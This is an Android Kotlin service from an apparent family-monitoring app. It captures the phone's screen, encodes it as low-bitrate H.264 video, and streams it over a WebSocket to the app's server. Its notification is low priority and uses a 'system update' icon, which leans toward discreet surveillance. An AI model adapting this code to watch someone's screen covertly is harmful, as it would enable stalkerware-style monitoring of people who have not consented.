package com.familyguardpro.services

import android.app.Activity
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI

class ScreenMirrorService : Service() {

    companion object {
        private const val TAG = "ScreenMirrorService"
        private const val NOTIFICATION_ID = 1004
        
        // Optimized for low bandwidth
        private const val VIDEO_WIDTH = 640
        private const val VIDEO_HEIGHT = 360
        private const val FRAME_RATE = 10
        private const val BIT_RATE = 250_000 // 250 kbps
        private const val I_FRAME_INTERVAL = 5
        
        private var resultCode: Int = 0
        private var resultData: Intent? = null
        
        fun setMediaProjectionResult(code: Int, data: Intent?) {
            resultCode = code
            resultData = data
        }
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var encoder: MediaCodec? = null
    private var encoderSurface: Surface? = null
    private var webSocketClient: WebSocketClient? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    private var isStreaming = false

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        startBackgroundThread()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        
        if (resultCode != 0 && resultData != null) {
            startStreaming()
        } else {
            Log.e(TAG, "MediaProjection permission not granted")
            stopSelf()
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
        stopBackgroundThread()
    }

    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("Screen Mirror")
            .setContentText("Sharing screen...")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("ScreenMirrorBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    private fun startStreaming() {
        if (isStreaming) return
        isStreaming = true
        
        connectWebSocket {
            initEncoder()
            initMediaProjection()
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        
        virtualDisplay?.release()
        virtualDisplay = null
        
        mediaProjection?.stop()
        mediaProjection = null
        
        encoder?.stop()
        encoder?.release()
        encoder = null
        
        encoderSurface?.release()
        encoderSurface = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val deviceId = preferenceManager.getDeviceId()
        val sessionId = "${deviceId}_screen"
        val wsUrl = "$baseUrl/ws?session=$sessionId&role=sender&deviceId=$deviceId&type=screen"
        
        Log.d(TAG, "Connecting to WebSocket: $wsUrl")
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {}

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed: $reason")
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun initEncoder() {
        try {
            val format = MediaFormat.createVideoFormat(
                MediaFormat.MIMETYPE_VIDEO_AVC,
                VIDEO_WIDTH,
                VIDEO_HEIGHT
            ).apply {
                setInteger(MediaFormat.KEY_COLOR_FORMAT,
                    MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
                setInteger(MediaFormat.KEY_BIT_RATE, BIT_RATE)
                setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE)
                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, I_FRAME_INTERVAL)
                setInteger(MediaFormat.KEY_PROFILE, MediaCodecInfo.CodecProfileLevel.AVCProfileBaseline)
            }
            
            encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
            encoder?.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            encoderSurface = encoder?.createInputSurface()
            
            encoder?.setCallback(object : MediaCodec.Callback() {
                override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
                
                override fun onOutputBufferAvailable(codec: MediaCodec, index: Int, info: MediaCodec.BufferInfo) {
                    try {
                        val buffer = codec.getOutputBuffer(index)
                        buffer?.let {
                            val data = ByteArray(info.size)
                            it.get(data)
                            sendEncodedFrame(data, info)
                        }
                        codec.releaseOutputBuffer(index, false)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing output buffer", e)
                    }
                }

                override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
                    Log.e(TAG, "Encoder error", e)
                }

                override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {
                    Log.d(TAG, "Encoder format changed")
                    val sps = format.getByteBuffer("csd-0")
                    val pps = format.getByteBuffer("csd-1")
                    sps?.let { sendConfigData(it) }
                    pps?.let { sendConfigData(it) }
                }
            }, backgroundHandler)
            
            encoder?.start()
            Log.d(TAG, "Encoder initialized")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize encoder", e)
        }
    }

    private fun initMediaProjection() {
        try {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData!!)
            
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.d(TAG, "MediaProjection stopped")
                    stopSelf()
                }
            }, backgroundHandler)
            
            createVirtualDisplay()
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize MediaProjection", e)
        }
    }

    private fun createVirtualDisplay() {
        val surface = encoderSurface ?: return
        
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenMirror",
            VIDEO_WIDTH,
            VIDEO_HEIGHT,
            resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            surface,
            null,
            backgroundHandler
        )
        
        Log.d(TAG, "Virtual display created")
    }

    private fun sendEncodedFrame(data: ByteArray, info: MediaCodec.BufferInfo) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val isKeyFrame = (info.flags and MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0
            val frameData = ByteArray(data.size + 1)
            frameData[0] = if (isKeyFrame) 1 else 0
            System.arraycopy(data, 0, frameData, 1, data.size)
            
            webSocketClient?.send(frameData)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send frame", e)
        }
    }

    private fun sendConfigData(buffer: java.nio.ByteBuffer) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val data = ByteArray(buffer.remaining())
            buffer.get(data)
            
            val configData = ByteArray(data.size + 1)
            configData[0] = 2
            System.arraycopy(data, 0, configData, 1, data.size)
            
            webSocketClient?.send(configData)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send config data", e)
        }
    }
}
